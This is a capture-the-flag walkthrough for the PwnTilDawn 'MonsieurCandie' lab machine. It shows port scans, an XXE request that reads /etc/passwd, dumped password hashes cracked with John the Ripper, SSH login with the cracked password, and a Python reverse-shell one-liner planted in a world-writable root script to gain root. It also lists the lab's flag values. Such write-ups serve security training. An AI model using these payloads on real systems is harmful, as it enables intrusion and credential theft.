---
layout: writeup
title: "MonsieurCandie Server Writeup"
date: 2025-06-10
platform: PwnTilDawn
---

# MonsieurCandie Server - CTF Walkthrough

## Overview
This document details the penetration testing process for the MonsieurCandie Server CTF machine, including specific commands executed during the exploitation process.

## Initial Reconnaissance

### Port Scanning
Initial quick port scan:
```bash
sudo nmap --min-rate 6000 -p- -r 10.150.150.226
PORT     STATE SERVICE
22/tcp   open  ssh
2623/tcp open  lmdp
8089/tcp open  unknown
```

Full service scan:
```bash
nmap -sS -sV -A -p- -T4 -v 10.150.150.226
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.6p1 Ubuntu 4
2623/tcp open  http     Werkzeug httpd 0.14.1 (Python 2.7.15rc1)
8089/tcp open  ssl/http Splunkd httpd
```

### Web Service Enumeration
Directory enumeration using dirsearch:
```bash
dirsearch -u http://10.150.150.226:2623/ -t 10
[Found]
200   2KB    http://10.150.150.226:2623/console
200   111B   http://10.150.150.226:2623/cookie
200   456B   http://10.150.150.226:2623/doc
200   915B   http://10.150.150.226:2623/xml
```

## Exploitation Process

### 1. Flag25 Discovery
- Found in browser cookies after accessing `/console`
- Flag Value: `15b6fcb5794a5ffacb0990b4f25d119a6ef1a264`

### 2. XML External Entity (XXE) Injection
Using Burp Suite, sent the following POST request:
```http
POST /xml HTTP/1.1
Host: 10.150.150.226:2623
Content-Type: application/x-www-form-urlencoded
Content-Length: 114

xml=<!DOCTYPE+foo[<!ELEMENT+foo+ANY><!ENTITY+xxe+SYSTEM+"file:///etc/passwd">]><foo>&xxe;</foo>
```

Retrieved password hashes through XXE:
```shell
# root hash
root:$6$xlC3bQRS$8oNexXXdatGMzY5BjQnLavMUX/TRfkr1HyiCYLdAV1eyVVFiZd9Uwbrohx3NQCPcMi5SpQzRdC.b7YCZjydps0:17924:0:99999:7:::

# MonsieurCandie hash  
MonsieurCandie:$6$LGidv.6A$9txwQnhm9MBCW7bgZ9Lz/syEeH5h6CFrEZc3wb/FZCUOg1SUXysjLYrFu0NmFmKzV2CvyRfGkD3LBPe1caWOV1:17841:0:99999:7:::

# wlx hash
wlx:$6$ovdqjNT7$Clayym1dl8b4IGTQPRu4vLQVkLnogTIPKKfu7OQEY6DS1DIbiR3Dv.WIays4LsH5nlISlixBxU/K1DSM
```

### 3. Password Hash Cracking
Used John the Ripper to crack the hashes:
```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 12 OpenMP threads
sunshine         (MonsieurCandie)
```

### 4. Initial Access
SSH access with cracked credentials:
```bash
ssh MonsieurCandie@10.150.150.226
Password: sunshine

# Get FLAG10
cat /home/MonsieurCandie/FLAG10
477c62501c6e800a01ca2f4a19143c1e
```

## Privilege Escalation

### Writable Script Discovery
Found writable script with root privileges:
```bash
ls -la /tmp/SrvMantainance.sh
-rwxrwxrwx 1 root root 89 Apr 28 2020 /tmp/SrvMantainance.sh
```

### Local Enumeration
Enumerated writable files:
```bash
find / -not -type l -perm -o+w 2>/dev/null | grep -v /proc
```

### Root Access
1. Setup listener on attacker machine:
```bash
ncat -nvlp 4443
```

2. Created reverse shell payload:
```python
nohup python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.66.67.198",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")' > /dev/null 2>&1 & disown
```

3. Injected payload into SrvMantainance.sh and executed:
```bash
./tmp/SrvMantainance.sh
```

4. Got root shell:
```bash
root@MonsieurCandie-Server:/tmp# whoami && id && hostname
root
uid=0(root) gid=0(root) groups=0(root)
MonsieurCandie-Server
```

5. Retrieved FLAG17:
```bash
cat /root/flag17
ef3465097bd16ef4d145aab2ff1f5baa
```

## Flags Obtained
1. FLAG25: `15b6fcb5794a5ffacb0990b4f25d119a6ef1a264`
2. FLAG17: `ef3465097bd16ef4d145aab2ff1f5baa`
3. FLAG10: `477c62501c6e800a01ca2f4a19143c1e`
4. FLAG24: `d`

## Additional Tools Used
1. Nmap for initial reconnaissance
2. Dirsearch for web directory enumeration
3. BurpSuite for web application testing and XXE exploitation
4. John the Ripper for password cracking
5. Custom Python scripts for exploitation
6. Netcat for reverse shell listener

## Security Recommendations
1. Disable debug console in production Werkzeug instances
2. Implement proper XML parsing with XXE prevention
3. Use strong password hashing algorithms
4. Remove writable root-owned scripts
5. Implement proper file permissions
6. Regular security audits of running services
